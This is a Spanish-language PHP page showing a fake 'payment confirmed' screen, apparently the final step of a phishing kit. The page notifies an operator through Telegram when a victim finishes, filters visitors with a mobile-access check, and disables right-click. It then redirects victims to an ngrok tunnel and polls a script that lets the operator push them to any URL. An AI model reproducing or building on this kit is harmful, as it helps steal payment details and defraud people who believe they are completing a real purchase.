
<?php
require_once 'functions.php';

checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('done');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pedido Confirmado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 100px; /* ESPACIO AÑADIDO PARA SEPARAR DEL FOOTER */

        }
        .header {
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }
        .logo {
            height: auto;
        }
        .container {
            background: white;
            padding: 60px 40px;
            border-radius: 15px;
            box-shadow: 0 0px 30px rgba(0,0,0,0.2);
            text-align: center;
            width: 90%;
            max-width: 500px;
            margin: 20px 0 40px 0;
        }
        .icon {
            font-size: 5em;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 1.5em;
        }
        p {
            color: #666;
            margin-bottom: 20px;
            line-height: 1.4;
            font-size: 0.95em;
        }
        .confirmation {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        .redirect-message {
            color: #177ECF;
            font-size: 0.9em;
            margin-top: 20px;
        }
        @media (max-width: 480px) {
            .container {
                padding: 40px 20px;
                margin: 15px 0 30px 0;
            }
            .header {
                padding: 5px 0;
            }
            .logo {
                max-width: 150px;
            }
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="header">
                 <a href="https://imgbb.com/"><img src="https://i.ibb.co/jP4NGJnh/T-l-chargement-2.jpg" alt="T-l-chargement-2" border="0" /></a>
        </div>

        <div class="container">
            <div class="icon">✅</div>
            <h2>Pago Confirmado</h2>
            
            <div class="confirmation">
                <h2> ¡Enhorabuena! </h2>
                <p>Su pago ha sido aceptado.</p>
            </div>

            <div class="redirect-message">
                Redirección automática en <span id="countdown">10</span> segundos...
            </div>
        </div>
    </div>

    <?php include 'footer.php'; ?>

<script>
// Prevenir clic derecho en toda la página
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Prevenir clic en imágenes
document.addEventListener('DOMContentLoaded', function() {
    const images = document.querySelectorAll('img');
    images.forEach(img => {
        img.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        // Prevenir arrastrar y soltar
        img.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
    });
});
</script>




    <script>
        // Redirección automática después de 10 segundos
        let countdown = 10;
        const countdownElement = document.getElementById('countdown');
        
        const countdownInterval = setInterval(function() {
            countdown--;
            countdownElement.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                window.location.href = 'https://brankie-adaptationally-averie.ngrok-free.dev/';
            }
        }, 1000);

        // Verificación de redirección adicional
        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>

